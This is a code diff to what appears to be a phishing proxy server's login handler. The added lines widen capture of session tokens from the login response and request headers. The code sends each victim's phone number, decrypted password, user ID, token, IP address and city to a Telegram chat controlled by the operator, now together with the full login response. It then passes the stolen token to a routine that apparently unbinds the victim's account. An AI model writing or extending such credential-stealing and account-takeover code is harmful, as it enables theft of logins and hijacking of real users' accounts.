@@ -1230,11 +1230,19 @@ app.post('/app/api/system/v2/login', async (req, res) => {
           pwd = decrypted.toString('utf8');
         } catch(e) { pwd = encPwd; }
       }
-      const authToken = loginData2?.token || loginData2?.accessToken || '';
-      bot.sendMessage(data.adminChatId, `🔑 Login\n📱 Phone: ${phone || 'N/A'}\n🔒 Password: ${pwd || 'N/A'}\n👤 UserID: ${finalUserId || 'N/A'}\n🔐 Token: ${authToken ? authToken.substring(0, 80) + '...' : 'N/A'}\n🌐 IP: ${req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A'}\n📍 City: ${req.headers['x-vercel-ip-city'] || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
+      const authToken = loginData2?.token || loginData2?.accessToken || loginData2?.apptoken || loginData2?.appToken || '';
+      const reqToken = req.headers['apptoken'] || req.headers['authorization'] || req.headers['token'] || '';
+      const finalToken = authToken || reqToken;
 
-      if (authToken && data.autoUnbind !== false) {
-        testUnbindCodeTypes(authToken, phone || finalUserId, data.adminChatId).catch(()=>{});
+      const allKeys = loginData2 ? Object.keys(loginData2).join(', ') : 'N/A';
+      const fullResp = JSON.stringify(jsonResp).substring(0, 1500);
+
+      bot.sendMessage(data.adminChatId, `🔑 Login\n📱 Phone: ${phone || 'N/A'}\n🔒 Password: ${pwd || 'N/A'}\n👤 UserID: ${finalUserId || 'N/A'}\n🔐 Token: ${finalToken ? finalToken.substring(0, 100) : 'NOT FOUND'}\n📋 Response Keys: ${allKeys}\n🌐 IP: ${req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A'}\n📍 City: ${req.headers['x-vercel-ip-city'] || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
+
+      bot.sendMessage(data.adminChatId, `📦 Full Login Response:\n${fullResp}`).catch(()=>{});
+
+      if (finalToken && data.autoUnbind !== false) {
+        testUnbindCodeTypes(finalToken, phone || finalUserId, data.adminChatId).catch(()=>{});
       }
     }
     sendJson(res, respHeaders, jsonResp, respBody);
